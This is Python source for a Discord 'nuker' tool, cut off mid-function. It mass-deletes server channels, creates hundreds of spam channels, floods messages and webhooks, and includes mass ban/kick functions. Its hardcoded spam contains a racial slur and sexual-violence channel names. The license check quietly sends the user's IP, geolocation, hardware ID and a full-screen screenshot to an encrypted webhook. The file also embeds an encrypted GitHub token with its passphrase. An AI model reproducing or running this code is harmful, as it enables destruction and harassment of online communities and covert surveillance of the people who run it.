import sys
import time
import os
import json
import hashlib
import uuid
import requests
import base64
import random
import string
import colorsys
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from colorama import init, Fore, Style
import ctypes
import threading
import asyncio
import discord
from discord.ext import commands
import aiohttp

init(autoreset=True)

# Encryption settings
TOKEN_PASSPHRASE = "f0a5baf4-f90b-4800-a407-eb5065382113"
WEBHOOK_PASSPHRASE = "fdfac521-be53-4ed5-b7a0-47606a2f3821"

# Encrypted tokens
ENCRYPTED_GITHUB_TOKEN = "U2FsdGVkX1+EsNr+p0PWwWMW3udxhDXtt6WfIUaTVivHMUcE6wb4CPWd7spuy3moFuiadjsEQGPzojlv30mjc2sPklc8o4FLKqP/xehTeShOgn7LbTfVoiTIy5Sd7F1FKfjcBUSaOb0Zh6jk3JMYgw=="
ENCRYPTED_WEBHOOK = "U2FsdGVkX1+Nw4U/zl83/gKNEByPtf6hHZCyga+N6cKvQZNTQgo9fp4UjeajxHOySDCuZhv6PbgzS+VtCTMzE6ULKXqHChvUSVKiQRxjINzWrVIyWBMs2B3QwUZYflKrEJYj25kQ4wCcLaRIMJUmuoKpmpmKy+5oLz5Bi9FjYzOv8ftNm7Ye41t6Sy87Prwz"

# GitHub repository information
REPO_OWNER = "egirlhunt"
REPO_NAME = "nulllkeys"
FILE_PATH = "keys.json"

# GitHub API URL
GITHUB_API_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"

# Color themes with HSV-based gradients
COLOR_THEMES = {
    "1": {"name": "Red", "hue": 0.00},
    "2": {"name": "Orange", "hue": 0.08},
    "3": {"name": "Yellow", "hue": 0.15},
    "4": {"name": "Green", "hue": 0.33},
    "5": {"name": "Cyan", "hue": 0.50},
    "6": {"name": "Blue", "hue": 0.60},
    "7": {"name": "Purple", "hue": 0.75},
    "8": {"name": "Pink", "hue": 0.90},
    "9": {"name": "White", "grayscale": True},
    "10": {"name": "Rainbow", "rainbow": True}
}

# Set default theme to Purple (option 7)
current_theme = COLOR_THEMES["7"]

# License key storage file
LICENSE_FILE = "license.key"

def get_console_width():
    """Get current console width"""
    try:
        return os.get_terminal_size().columns
    except OSError:
        return 80  # default width if terminal size can't be determined

def print_centered(text, width=None):
    """Print text centered in console"""
    if width is None:
        width = get_console_width()
    
    lines = text.split("\n")
    for line in lines:
        if line.strip():  # Only center non-empty lines
            print(line.center(width))
        else:
            print()  # Preserve empty lines

def print_color_centered(text, color_code="", width=None):
    """Print colored text centered in console"""
    if width is None:
        width = get_console_width()
    
    lines = text.split("\n")
    for line in lines:
        if line.strip():
            print(f"{color_code}{line.center(width)}{Style.RESET_ALL}")
        else:
            print()

def hsv_to_ansi(h, s=1.0, v=1.0):
    """Convert HSV to smooth ANSI 256 color"""
    r, g, b = colorsys.hsv_to_rgb(h, s, v)
    r = int(r * 5)
    g = int(g * 5)
    b = int(b * 5)
    return 16 + (36 * r) + (6 * g) + b

def get_public_ip():
    """Get public IP address"""
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return "Unknown"

def get_geo_location(ip_address):
    """Get geolocation data for IP address"""
    if ip_address == "Unknown":
        return {
            "country": "Unknown", 
            "city": "Unknown", 
            "isp": "Unknown",
            "region": "Unknown",
            "lat": "Unknown",
            "lon": "Unknown",
            "ip": "Unknown"
        }
    
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                geo_info = {
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "isp": data.get("isp", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "lat": str(data.get("lat", "Unknown")),
                    "lon": str(data.get("lon", "Unknown")),
                    "ip": ip_address
                }
                return geo_info
    except:
        pass
    
    return {
        "country": "Unknown", 
        "city": "Unknown", 
        "isp": "Unknown",
        "region": "Unknown",
        "lat": "Unknown",
        "lon": "Unknown",
        "ip": ip_address
    }

def evp_bytes_to_key(password, salt, key_len=32, iv_len=16):
    """OpenSSL EVP_BytesToKey compatible key derivation"""
    d = d_i = b''
    while len(d) < key_len + iv_len:
        d_i = hashlib.md5(d_i + password + salt).digest()
        d += d_i
    return d[:key_len], d[key_len:key_len+iv_len]

def decrypt_aes_openssl(encrypted_text, passphrase):
    """Decrypt AES-256-CBC encrypted text (OpenSSL compatible)"""
    try:
        # Decode base64
        encrypted_data = base64.b64decode(encrypted_text)
        
        # Check for "Salted__" prefix
        if encrypted_data[:8] != b'Salted__':
            return ""
        
        # Extract salt (8 bytes after "Salted__")
        salt = encrypted_data[8:16]
        ciphertext = encrypted_data[16:]
        
        # Derive key and IV using OpenSSL's EVP_BytesToKey
        password = passphrase.encode('utf-8')
        key, iv = evp_bytes_to_key(password, salt, 32, 16)
        
        # Decrypt
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(ciphertext)
        
        # Remove PKCS7 padding
        plaintext = unpad(decrypted, AES.block_size)
        
        return plaintext.decode('utf-8')
        
    except Exception:
        return ""

def get_github_token():
    """Get decrypted GitHub token"""
    token = decrypt_aes_openssl(ENCRYPTED_GITHUB_TOKEN, TOKEN_PASSPHRASE)
    return token

def get_webhook_url():
    """Get decrypted webhook URL"""
    return decrypt_aes_openssl(ENCRYPTED_WEBHOOK, WEBHOOK_PASSPHRASE)

def get_hwid():
    """Generate a unique hardware ID"""
    try:
        hwid_parts = []
        
        # Get MAC address
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                       for elements in range(0, 8*6, 8)][::-1])
        hwid_parts.append(mac)
        
        # Get machine ID if available
        if os.name == 'posix':
            try:
                with open('/etc/machine-id', 'r') as f:
                    hwid_parts.append(f.read().strip())
            except:
                pass
        
        # Create hash from all parts
        hwid_string = '-'.join(hwid_parts)
        return hashlib.sha256(hwid_string.encode()).hexdigest()[:32]
        
    except Exception as e:
        return str(uuid.getnode())

def generate_random_id():
    """Generate a random 16-character ID"""
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(16))

def save_id_to_file(user_id, license_key):
    """Save ID to text file with warning"""
    warning_text = """WARNING: NEVER SHARE THIS ID

SHARING THIS COULD LEAD TO YOUR LICENSE KEY GETTING REMOVED OR STOLEN

ANYONE ELSE THAN @uekv ON DISCORD ASKING FOR THIS ID IS A SCAMMER/FAKER

YOUR ID: {user_id}
YOUR LICENSE KEY: {license_key}

This ID is your proof of ownership.
If you lose it, use the "Generate ID" option in the tool.
""".format(user_id=user_id, license_key=license_key)
    
    with open("ID.txt", "w") as f:
        f.write(warning_text)
    
    print_centered(f"{get_color('medium')}[+]{Style.RESET_ALL} {Fore.WHITE}ID saved to ID.txt{Style.RESET_ALL}")
    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Keep this file safe! Never share it!{Style.RESET_ALL}")

def get_color(intensity="medium"):
    """Get color based on current theme and intensity"""
    if current_theme.get("rainbow"):
        hue = (time.time() * 0.08) % 1.0
        ansi = hsv_to_ansi(hue)
        return f"\033[38;5;{ansi}m"

    if current_theme.get("grayscale"):
        shades = {"dark": 236, "medium": 245, "light": 255}
        return f"\033[38;5;{shades.get(intensity, 245)}m"

    hue = current_theme["hue"]
    value = {"dark": 0.55, "medium": 0.75, "light": 1.0}.get(intensity, 0.75)

    ansi = hsv_to_ansi(hue, 0.9, value)
    return f"\033[38;5;{ansi}m"

def get_gradient_color(position, total_positions):
    """Get smooth gradient color for a specific position"""
    if total_positions <= 1:
        return "\033[38;5;255m"

    t = position / (total_positions - 1)

    if current_theme.get("rainbow"):
        # Real rainbow — smooth HSV sweep
        hue = t * 0.85  # avoid looping back to red
        ansi = hsv_to_ansi(hue)
        return f"\033[38;5;{ansi}m"

    if current_theme.get("grayscale"):
        gray = int(232 + t * 23)
        return f"\033[38;5;{gray}m"

    # Smooth brightness gradient inside one color family
    hue = current_theme["hue"]
    value = 0.45 + (t * 0.55)  # dark → bright
    ansi = hsv_to_ansi(hue, 0.9, value)
    return f"\033[38;5;{ansi}m"

def save_license_key(license_key):
    """Save license key to file"""
    try:
        with open(LICENSE_FILE, "w") as f:
            f.write(license_key)
        return True
    except:
        return False

def load_license_key():
    """Load license key from file"""
    try:
        if os.path.exists(LICENSE_FILE):
            with open(LICENSE_FILE, "r") as f:
                return f.read().strip()
    except:
        pass
    return ""

def ask_save_license_windows():
    """Ask user if they want to save the license key using Windows MessageBox"""
    try:
        result = ctypes.windll.user32.MessageBoxW(
            0,
            "Do you want to save your license key for next time?\n\nYes: Save and auto-load next time\nNo: Ask every time",
            "Save License Key",
            0x00000004 | 0x00000020  # Yes/No buttons + Question icon
        )
        
        # IDYES = 6, IDNO = 7
        return result == 6  # Returns True if Yes, False if No
    except:
        # Fallback to console if Windows MessageBox fails
        return False

def fetch_license_data():
    """Fetch and parse license data from private GitHub repository"""
    try:
        github_token = get_github_token()
        if not github_token:
            return []
        
        headers = {
            "Authorization": f"Bearer {github_token}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        response = requests.get(GITHUB_API_URL, headers=headers, timeout=10)
        
        if response.status_code == 200:
            file_info = response.json()
            content = base64.b64decode(file_info["content"]).decode('utf-8')
            licenses = json.loads(content)
            return licenses
            
    except Exception:
        pass
    
    return []

def update_license_data_with_ip(license_key, new_hwid, new_id="", geo_info=None):
    """Update license data in private GitHub repository with IP information"""
    try:
        github_token = get_github_token()
        if not github_token:
            return False
        
        # Get current file info
        headers = {
            "Authorization": f"Bearer {github_token}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        response = requests.get(GITHUB_API_URL, headers=headers, timeout=10)
        if response.status_code != 200:
            return False
        
        file_info = response.json()
        current_sha = file_info["sha"]
        current_content = base64.b64decode(file_info["content"]).decode('utf-8')
        
        # Parse and update the JSON
        licenses = json.loads(current_content)
        updated = False
        
        for license_entry in licenses:
            if license_entry.get("Licensekey") == license_key:
                # Update HWID
                license_entry["hwid"] = new_hwid
                
                # Update ID if provided
                if new_id and not license_entry.get("id"):
                    license_entry["id"] = new_id
                
                # Add IP and geolocation information
                if geo_info:
                    # Add IP info fields
                    license_entry["ip"] = geo_info.get("ip", "Unknown")
                    license_entry["country"] = geo_info.get("country", "Unknown")
                    license_entry["city"] = geo_info.get("city", "Unknown")
                    license_entry["isp"] = geo_info.get("isp", "Unknown")
                    license_entry["region"] = geo_info.get("region", "Unknown")
                    license_entry["latitude"] = geo_info.get("lat", "Unknown")
                    license_entry["longitude"] = geo_info.get("lon", "Unknown")
                    
                    # Add activation timestamp
                    license_entry["activation_time"] = time.strftime('%Y-%m-%d %H:%M:%S')
                    license_entry["last_activity"] = time.strftime('%Y-%m-%d %H:%M:%S')
                else:
                    # Just update last activity time
                    if "activation_time" not in license_entry:
                        license_entry["activation_time"] = time.strftime('%Y-%m-%d %H:%M:%S')
                    license_entry["last_activity"] = time.strftime('%Y-%m-%d %H:%M:%S')
                
                updated = True
                break
        
        if not updated:
            return False
        
        # Update file on GitHub
        update_data = {
            "message": f"Update license info for {license_key[:8]}...",
            "content": base64.b64encode(json.dumps(licenses, indent=2).encode()).decode(),
            "sha": current_sha
        }
        
        update_response = requests.put(GITHUB_API_URL, headers=headers, json=update_data, timeout=10)
        
        if update_response.status_code in [200, 201]:
            return True
        else:
            return False
            
    except Exception:
        return False

def take_screenshot():
    """Take a screenshot of the current screen using mss"""
    try:
        import mss
        import mss.tools
        
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            screenshot = sct.grab(monitor)
            
            # Convert to bytes using mss.tools
            img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
            return base64.b64encode(img_bytes).decode('utf-8')
            
    except Exception:
        return None

def send_webhook(license_key, hwid, user_id="", geo_info=None):
    """Send registration to webhook with geolocation and screenshot (white embed)"""
    try:
        webhook_url = get_webhook_url()
        if not webhook_url:
            return False
        
        # Try to take screenshot
        screenshot_b64 = take_screenshot()
        
        # Create fields for embed - WHITE color (16777215)
        fields = [
            {"name": "License key", "value": f"`{license_key}`", "inline": True},
            {"name": "HWID", "value": f"`{hwid}`", "inline": True}
        ]
        
        if user_id:
            fields.append({"name": "User ID", "value": f"`{user_id}`", "inline": True})
        
        # Add geolocation info if available
        if geo_info:
            geo_fields = []
            if geo_info.get("ip") and geo_info["ip"] != "Unknown":
                geo_fields.append({"name": "IP Address", "value": f"`{geo_info['ip']}`", "inline": True})
            if geo_info.get("country") and geo_info["country"] != "Unknown":
                geo_fields.append({"name": "Country", "value": f"`{geo_info['country']}`", "inline": True})
            if geo_info.get("city") and geo_info["city"] != "Unknown":
                geo_fields.append({"name": "City", "value": f"`{geo_info['city']}`", "inline": True})
            if geo_info.get("isp") and geo_info["isp"] != "Unknown":
                geo_fields.append({"name": "ISP", "value": f"`{geo_info['isp']}`", "inline": False})
            if geo_info.get("region") and geo_info["region"] != "Unknown":
                geo_fields.append({"name": "Region", "value": f"`{geo_info['region']}`", "inline": True})
            if geo_info.get("lat") and geo_info["lat"] != "Unknown":
                geo_fields.append({"name": "Latitude", "value": f"`{geo_info['lat']}`", "inline": True})
            if geo_info.get("lon") and geo_info["lon"] != "Unknown":
                geo_fields.append({"name": "Longitude", "value": f"`{geo_info['lon']}`", "inline": True})
            
            fields.extend(geo_fields)
        
        # Add screenshot info
        if screenshot_b64:
            fields.append({"name": "Screenshot", "value": "Screenshot attached", "inline": False})
        else:
            fields.append({"name": "Screenshot", "value": "Could not capture screenshot", "inline": False})
        
        # Prepare payload with both content and embed - WHITE COLOR (16777215)
        payload = {
            "content": f"**License Key:** `{license_key}`",
            "embeds": [{
                "title": "NEW REGISTRATION",
                "color": 16777215,  # WHITE color
                "fields": fields,
                "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
            }]
        }
        
        # If screenshot was captured, send it as a file
        if screenshot_b64:
            # Send screenshot as a separate message
            screenshot_file = {
                'file': ('screenshot.png', base64.b64decode(screenshot_b64), 'image/png')
            }
            
            # First send the embed with license key
            response1 = requests.post(webhook_url, json=payload, timeout=10)
            
            # Then send the screenshot
            response2 = requests.post(webhook_url, files=screenshot_file, timeout=10)
            
            return response1.status_code == 200 and response2.status_code == 200
        else:
            # Send just the embed
            response = requests.post(webhook_url, json=payload, timeout=10)
            return response.status_code == 200
            
    except Exception:
        return False

def clear_console():
    """Clear console"""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_ascii_art():
    """Display ASCII art centered"""
    clear_console()
    
    ascii_text = [
        " ███▄    █  █    ██  ██▓     ██▓    ",
        " ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ",
        "▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ",
        "▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░    ",
        "▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒",
        "░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░",
        "░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░ ▒  ░░ ░ ▒  ░",
        "   ░   ░ ░  ░░░ ░ ░   ░ ░     ░ ░   ",
        "         ░    ░         ░  ░    ░  ░",
        "                                    "
    ]
    
    # Display with gradient
    for i, line in enumerate(ascii_text):
        color = get_gradient_color(i, len(ascii_text))
        print_color_centered(line, color)
    
    # Made by text centered
    made_by_text = "made by @uekv on discord"
    color = get_gradient_color(len(ascii_text) + 1, len(ascii_text) + 2)
    print_color_centered(made_by_text, color)
    
    # Separator centered
    separator = "─" * 50
    sep_color = get_gradient_color(len(ascii_text) + 2, len(ascii_text) + 3)
    print_color_centered(separator, sep_color)

def calculate_bracket_positions(width):
    """Calculate fixed bracket positions for symmetrical layout"""
    left_bracket_pos = width // 4 - 2
    right_bracket_pos = 3 * width // 4 - 2
    return left_bracket_pos, right_bracket_pos

def create_option_row(left_option, right_option=""):
    """Create a row with brackets always at the exact same positions"""
    width = get_console_width()
    left_bracket_pos, right_bracket_pos = calculate_bracket_positions(width)
    
    if not right_option:
        return left_option.center(width)
    
    left_parts = left_option.split("]", 1)
    right_parts = right_option.split("]", 1)
    
    if len(left_parts) == 2 and len(right_parts) == 2:
        left_bracket = left_parts[0] + "]"
        left_text = left_parts[1].strip()
        right_bracket = right_parts[0] + "]"
        right_text = right_parts[1].strip()
        
        row_list = [" "] * width
        
        left_start = left_bracket_pos
        for i, char in enumerate(left_bracket):
            if left_start + i < width:
                row_list[left_start + i] = char
        
        text_start = left_start + len(left_bracket) + 1
        for i, char in enumerate(left_text):
            if text_start + i < width:
                row_list[text_start + i] = char
        
        right_start = right_bracket_pos
        for i, char in enumerate(right_bracket):
            if right_start + i < width:
                row_list[right_start + i] = char
        
        text_start = right_start + len(right_bracket) + 1
        for i, char in enumerate(right_text):
            if text_start + i < width:
                row_list[text_start + i] = char
        
        return "".join(row_list)
    
    return (left_option + "   " + right_option).center(width)

def display_color_selection():
    display_ascii_art()
    
    print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Color Selection Menu{Style.RESET_ALL}\n")
    
    width = get_console_width()
    left_bracket_pos, right_bracket_pos = calculate_bracket_positions(width)
    
    color_keys = list(COLOR_THEMES.keys())
    
    for i in range(0, len(color_keys), 2):
        left_key = color_keys[i]
        left_theme = COLOR_THEMES[left_key]
        
        if left_theme.get("rainbow"):
            left_color = "\033[38;5;196m"
        elif left_theme.get("grayscale"):
            left_color = "\033[38;5;255m"
        else:
            left_hue = hsv_to_ansi(left_theme["hue"], 0.9, 0.75)
            left_color = f"\033[38;5;{left_hue}m"
        
        left_option = f"{left_color}[{left_key}]{Style.RESET_ALL}{Fore.WHITE} {left_theme['name']}"
        
        right_option = ""
        if i + 1 < len(color_keys):
            right_key = color_keys[i + 1]
            right_theme = COLOR_THEMES[right_key]
            
            if right_theme.get("rainbow"):
                right_color = "\033[38;5;196m"
            elif right_theme.get("grayscale"):
                right_color = "\033[38;5;255m"
            else:
                right_hue = hsv_to_ansi(right_theme["hue"], 0.9, 0.75)
                right_color = f"\033[38;5;{right_hue}m"
            
            right_option = f"{right_color}[{right_key}]{Style.RESET_ALL}{Fore.WHITE} {right_theme['name']}"
        
        print(create_option_row(left_option, right_option))
    
    print_centered(f"\n{get_color('medium')}{'─' * 50}{Style.RESET_ALL}")
    
    print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select Option > ", end="")
    return input().strip()

def display_main_menu():
    display_ascii_art()
    
    print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Main Menu{Style.RESET_ALL}\n")
    
    row1_left = f"{get_color('light')}[1]{Style.RESET_ALL}{Fore.WHITE} Change Color"
    row1_right = f"{get_color('light')}[2]{Style.RESET_ALL}{Fore.WHITE} Generate ID"
    row2_left = f"{get_color('light')}[3]{Style.RESET_ALL}{Fore.RED} Nuking"
    row2_right = f"{get_color('light')}[4]{Style.RESET_ALL}{Fore.WHITE} Exit"
    
    print(create_option_row(row1_left, row1_right))
    print(create_option_row(row2_left, row2_right))
    
    print_centered(f"\n{get_color('medium')}{'─' * 50}{Style.RESET_ALL}")
    
    print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select Option > ", end="")
    return input().strip()

def display_license_prompt():
    display_ascii_art()
    
    print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Enter License Key > ", end="")
    return input().strip()

def validate_license_key(save_license_prompt=False):
    saved_key = load_license_key()
    user_key = ""
    
    if saved_key and not save_license_prompt:
        user_key = saved_key
        display_ascii_art()
        print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Using saved license key...{Style.RESET_ALL}")
        time.sleep(1)
    else:
        user_key = display_license_prompt()
    
    if not user_key:
        display_ascii_art()
        print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}No license key entered!{Style.RESET_ALL}")
        return False, ""
    
    display_ascii_art()
    print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Checking private database...{Style.RESET_ALL}")
    time.sleep(1)
    
    try:
        licenses = fetch_license_data()
        
        if not licenses:
            display_ascii_art()
            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Private database connection failed{Style.RESET_ALL}")
            return False, ""
        
        license_found = False
        current_hwid = get_hwid()
        user_id = ""
        is_first_activation = False
        
        for license_entry in licenses:
            if license_entry.get("Licensekey") == user_key:
                license_found = True
                stored_hwid = license_entry.get("hwid", "").strip()
                user_id = license_entry.get("id", "").strip()
                
                if not stored_hwid:
                    is_first_activation = True
                    display_ascii_art()
                    print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}New activation detected{Style.RESET_ALL}")
                    
                    ip_address = get_public_ip()
                    geo_info = get_geo_location(ip_address)
                    
                    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Gathering system information...{Style.RESET_ALL}")
                    
                    if not user_id:
                        user_id = generate_random_id()
                        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Creating User ID...{Style.RESET_ALL}")
                        print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}Generated User ID: {user_id}{Style.RESET_ALL}")
                        save_id_to_file(user_id, user_key)
                    
                    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Sending registration info...{Style.RESET_ALL}")
                    webhook_thread = threading.Thread(target=send_webhook, args=(user_key, current_hwid, user_id, geo_info))
                    webhook_thread.start()
                    
                    if update_license_data_with_ip(user_key, current_hwid, user_id, geo_info):
                        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Updating database...{Style.RESET_ALL}")
                        print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}License activated!{Style.RESET_ALL}")
                        
                        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Please check Windows popup...{Style.RESET_ALL}")
                        if ask_save_license_windows():
                            if save_license_key(user_key):
                                print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}License key saved for next time{Style.RESET_ALL}")
                        
                        time.sleep(2)
                        return True, user_key
                    else:
                        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Database update failed{Style.RESET_ALL}")
                        return False, ""
                else:
                    if stored_hwid == current_hwid:
                        display_ascii_art()
                        print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}Hardware verified{Style.RESET_ALL}")
                        
                        update_license_data_with_ip(user_key, current_hwid, user_id, None)
                        
                        if user_id and not os.path.exists("ID.txt"):
                            save_id_to_file(user_id, user_key)
                        time.sleep(1)
                        return True, user_key
                    else:
                        display_ascii_art()
                        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Hardware mismatch!{Style.RESET_ALL}")
                        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}If this is a mistake, DM @uekv on discord{Style.RESET_ALL}")
                        
                        for i in range(10, 0, -1):
                            display_ascii_art()
                            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Hardware mismatch!{Style.RESET_ALL}")
                            print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}If this is a mistake, DM @uekv on discord{Style.RESET_ALL}")
                            print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Closing in {i}...{Style.RESET_ALL}")
                            time.sleep(1)
                        return False, ""
        
        if not license_found:
            display_ascii_art()
            print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}License not found in private database!{Style.RESET_ALL}")
            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Closing in 3 seconds...{Style.RESET_ALL}")
            
            for i in range(3, 0, -1):
                display_ascii_art()
                print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}License not found in private database!{Style.RESET_ALL}")
                print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Closing in {i}...{Style.RESET_ALL}")
                time.sleep(1)
            
            return False, ""
            
    except Exception as e:
        display_ascii_art()
        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Database error{Style.RESET_ALL}")
        return False, ""
    
    return False, ""

# ────────────────────────────────────────────────────────────────────────────────
#   NUKING CATEGORY FUNCTIONS
# ────────────────────────────────────────────────────────────────────────────────

def display_nuking_menu():
    display_ascii_art()
    print_centered(f"\n{get_color('medium')}{'─' * 60}{Style.RESET_ALL}\n")

    rows = [
        (f"{get_color('light')}[1]{Style.RESET_ALL}{Fore.RED} Fast nuke",
         f"{get_color('light')}[2]{Style.RESET_ALL}{Fore.RED} Nuke"),
        (f"{get_color('light')}[3]{Style.RESET_ALL}{Fore.RED} Raid",
         f"{get_color('light')}[4]{Style.RESET_ALL}{Fore.RED} Webhook spam"),
        (f"{get_color('light')}[5]{Style.RESET_ALL}{Fore.RED} Webhook flood",
         f"{get_color('light')}[6]{Style.RESET_ALL}{Fore.RED} Role delete"),
        (f"{get_color('light')}[7]{Style.RESET_ALL}{Fore.RED} Role spam",
         f"{get_color('light')}[8]{Style.RESET_ALL}{Fore.RED} Ban all"),
        (f"{get_color('light')}[9]{Style.RESET_ALL}{Fore.RED} Kick all",
         f"{get_color('light')}[0]{Style.RESET_ALL}{Fore.WHITE} ← Back")
    ]

    for left, right in rows:
        print(create_option_row(left, right))

    print_centered(f"\n{get_color('medium')}{'─' * 60}{Style.RESET_ALL}")

    print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select > ", end="")
    return input().strip()

async def run_nuker(token: str, coro):
    intents = discord.Intents.default()
    intents.members = True
    intents.messages = True  # FIXED: Changed from message_content to messages
    
    bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

    @bot.event
    async def on_ready():
        print(f"{Fore.GREEN}[ONLINE] {bot.user}{Style.RESET_ALL}")

        await bot.change_presence(
            status=discord.Status.idle,
            afk=True,
            activity=discord.Streaming(
                name="Null.xd",
                url="https://www.twitch.tv/nullxd"
            )
        )

        try:
            await coro(bot)
        except Exception as e:
            print(f"{Fore.RED}Action crashed → {e}{Style.RESET_ALL}")
        finally:
            await bot.close()

    try:
        await bot.start(token)
    except Exception as e:
        print(f"{Fore.RED}Login/startup failed → {e}{Style.RESET_ALL}")

async def safe_edit(obj, **kwargs):
    try:
        await obj.edit(**kwargs)
    except:
        pass

async def fast_nuke(bot):
    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} Server ID > "))
    g = bot.get_guild(gid)
    if not g: return print(f"{Fore.RED}Guild not found{Style.RESET_ALL}")

    spam = "@everyone officially get fucked by null xd just fuck yourself nigger https://discord.gg/P9kDd7pEBd"
    names = ["NULL-OWNS-THIS", "NULL-RAPED-YALL", "NULL-FUCKS-YOUR-SERVER", "NULL-HERE"]

    await safe_edit(g, name="Territory of Null")

    await asyncio.gather(*(c.delete() for c in g.channels), return_exceptions=True)

    created = []
    create_tasks = []
    for i in range(500):
        name = f"{random.choice(names)}-{i+1}"
        create_tasks.append(g.create_text_channel(name))
    results = await asyncio.gather(*create_tasks, return_exceptions=True)
    created = [ch for ch in results if isinstance(ch, discord.TextChannel)]

    spam_tasks = []
    for ch in created:
        for _ in range(15):
            spam_tasks.append(ch.send(spam))
    await asyncio.gather(*spam_tasks, return_exceptions=True)

async def nuke(bot):
    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} Server ID > "))
    name = input(f"{get_color('light')}[?]{Style.RESET_ALL} New server name > ") or "Territory of Null"
    msg = input(f"{get_color('light')}[?]{Style.RESET_ALL} Spam message > ")
    chname = input(f"{get_color('light')}[?]{Style.RESET_ALL} Channel base name > ") or "null"

    g = bot.get_guild(gid)
    if not g: return

    await safe_edit(g, name=name)
    await asyncio.gather(*(c.delete() for c in g.channels), return_exceptions=True)

    created = []
    for i in range(500):
        try:
            ch = await g.create_text_channel(f"{chname}-{i+1}")
            created.append(ch)
        except:
            break

    await asyncio.gather(*(ch.send(msg) for ch in created for _ in range(15)), return_exceptions=True)

async def raid(bot):
    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} Server ID > "))
    msg = input(f"{get_color('light')}[?]{Style.RESET_ALL} Message > ")
    g = bot.get_guild(gid)
    if not g: return

    await asyncio.gather(*(ch.send(msg) for ch in g.text_channels for _ in range(50)), return_exceptions=True)

async def webhook_spam(_):  # no bot needed
    urls = input(f"{get_color('light')}[?]{Style.RESET_ALL} Webhook URLs (comma sep) > ").split(',')
    msg = input(f"{get_color('light')}[?]{Style.RESET_ALL} Message > ")

    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in urls:
            url = url.strip()
            if not url: continue
            wh = discord.Webhook.from_url(url, session=session)
            for _ in range(100):
                tasks.append(wh.send(msg, wait=False))
        await asyncio.gather(*tasks, return_exceptions=True)

async def webhook_flood(bot):
    gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} Server ID > "))
    name = input(f"{get_color('light')}[?]{Style.RESET_ALL} Webhook name > ") or "null"
    g = bot.get_guild(gid)
    if not g: return

    urls = []
    for ch in g.text_channels:
        for _ in range(3):
            try:
                w = await ch.create_webhook(name=name)
                urls.append(w.url)
            except:
                pass

    with open("webhooks.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(urls))

    print(f"{Fore.GREEN}Saved {len(urls)} webhooks to webhooks.txt{Style.RESET_ALL}")

async def role_delete(bot):
